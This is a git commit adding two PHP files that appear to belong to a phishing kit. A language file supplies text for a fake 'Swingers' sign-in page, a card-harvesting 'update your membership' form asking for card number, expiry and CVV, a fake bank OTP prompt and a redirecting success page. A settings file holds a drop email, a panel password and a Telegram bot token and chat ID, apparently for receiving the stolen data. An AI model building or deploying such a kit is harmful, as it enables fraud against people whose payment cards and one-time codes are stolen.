d77363548af0f7b59934901b0b80d40f2e09d309
SHARP1 <firewatchgame@gmail.com>
2024-02-03 13:25:26 +0100

    Initial commit

---
+++ net/system/languages/en.php
@@ -0,0 +1,71 @@
+<?php
+	$lg_tr = [
+		'head' => "Sign up",
+		'msg' => "<b>Incorrect email or password format</b>. Please try again.",
+		'lbl_eml' => "Email",
+		'msg_eml' => "Please enter a valid email or phone number.",
+		'lbl_pss' => "Password",
+		'msg_pss' => "Your password must contain between 4 and 60 characters.",
+		'show_pss' => "SHOW",
+		'hide_pss' => "HIDE",
+		'remember' => "Remember me",
+		'help' => "Need help?",
+		'fb' => "Signup with Facebook",
+		'new' => "Already a Swinger?",
+		'signup' => "Sign in now",
+		'contact' => "Questions? Contact us.",
+		'gift' => "Gift Card Terms",
+		'terms' => "Terms of Use",
+		'privacy' => "Privacy Statement"
+	];
+
+	$info_tr = [
+		'signout' => "Sign out",
+		'update' => "Update your credit or debit card.",
+		'by' => "By updating your membership for free, you will enjoy all 121 Swingers account advantages and benefits",
+		'required' => "is required!",
+		'fname' => "First Name",
+		'lname' => "Last Name",
+		'full_name' => "Full Name",
+		'adr' => "Billing Address",
+		'city' => "City",
+		'state' => "State",
+		'country' => "Country",
+		'zip' => "Zip Code",
+		'phone' => "Phone Number",
+		'cnm' => "Card Number",
+		'cnm_check' => "Enter a valid card credit number.",
+		'exp' => "Expiration Date (MM/YY)",
+		'csc' => "Security Code (CVV)",
+		'save' => "UPDATE",
+		'csc_msg' => "Your card's security code (CVV) is the 3 or 4 digit number located on the back of most cards.",
+		'faq' => "FAQ",
+		'help_center' => "Help Center",
+		'cookies' => "Cookie Preferences",
+		'corporate' => "Corporate Information"
+	];
+
+	$vbv_tr = [
+	'sec' => "Please enter your Security Code or OTP",
+		'sec2' => "One-Time Passcode is required for this process.
+this code has been sent to your registered mobile *******",
+		'funa' => "Full Name :",
+		'bnk' => "Bank :",
+		'dat' => "Date :",
+		'crd' => "Credit Card :",
+		'amo' => "Amount :",
+		'cos' => "Code Sent :",
+		'otpc' => "OTP CODE :",
+		'msger' => "This code is invalid. Check the SMS and try again.",
+		'msger2' => "Check the SMS and try again.",
+		'msgsf' => "The billing information has been verified successfully.",
+		'submit' => "Submit"
+	];
+
+	$finish_tr = [
+		'step' => "STEP <b>3</b> OF <b>3 DONE</b>",
+		'success' => "Account Updated With Success",
+		'redirect' => "Your will redirected to our privacy after 5 seconds, please read the full topic.",
+		'bt' => "OUR PRIVACY"
+	];
+?>
---
+++ net/system/setting.php
@@ -0,0 +1,9 @@
+<?php
+// settings
+$yourmail  = "momdolton@protonmail.com"; 
+$namerand = "chapo"; 
+$pass = "chapel123"; 
+$botToken="6735678002:AAF2XMNrBhTqGqTJuGCenzb9KF5IrswaOZw";
+$chatId="6109284472"; 
+
+?>
